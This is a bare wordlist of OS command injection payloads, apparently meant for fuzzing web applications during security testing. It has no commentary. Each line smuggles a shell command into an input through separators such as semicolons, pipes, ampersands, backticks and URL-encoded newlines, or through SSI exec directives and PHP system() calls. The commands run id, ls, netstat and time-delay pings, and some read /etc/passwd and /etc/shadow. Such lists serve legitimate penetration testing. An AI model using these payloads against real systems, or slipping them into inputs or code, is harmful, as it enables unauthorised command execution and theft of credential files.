"& ping -i 30 127.0.0.1 &"
";id;"
"\n/bin/ls -al\n"
"|/usr/bin/id|"
"|id|"
"||/usr/bin/id|"
$;/usr/bin/id
%0A/usr/bin/id
%0A/usr/bin/id%0A
%0Acat%20/etc/passwd
%0Aid
%0Aid%0A
%0a id %0a
%0a ping -i 30 127.0.0.1 %0a
%22%0A/usr/bin/id%0A%22
%27%0A/usr/bin/id%0A%27
& id
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
'& ping -i 30 127.0.0.1 &'
';id;'
'\n/bin/ls -al\n'
'|/usr/bin/id|'
'|id|'
'||/usr/bin/id|'
/index.html|id|
; id
;/usr/bin/id\n
;id
;id;
;id\n
;id|
;netstat -a;
;system('/usr/bin/id')
;system('cat%20/etc/passwd')
;system('id')
;|/usr/bin/id|
\n/bin/ls -al\n
\n/usr/bin/id;
\n/usr/bin/id\n
\n/usr/bin/id|
\nid;
\nid\n
\nid|
`/usr/bin/id`
`id`
`ping 127.0.0.1`
a);/usr/bin/id
a);/usr/bin/id;
a);/usr/bin/id|
a);id
a);id;
a);id|
a)|/usr/bin/id
a)|/usr/bin/id;
a)|id
a)|id;
a;/usr/bin/id
a;/usr/bin/id;
a;/usr/bin/id|
a;id
a;id;
a;id|
a|/usr/bin/id
a|id
| id
|/bin/ls -al
|/usr/bin/id
|/usr/bin/id|
|id
|id;
|id|
|nid\n
|usr/bin/id\n
||/usr/bin/id;
||/usr/bin/id|
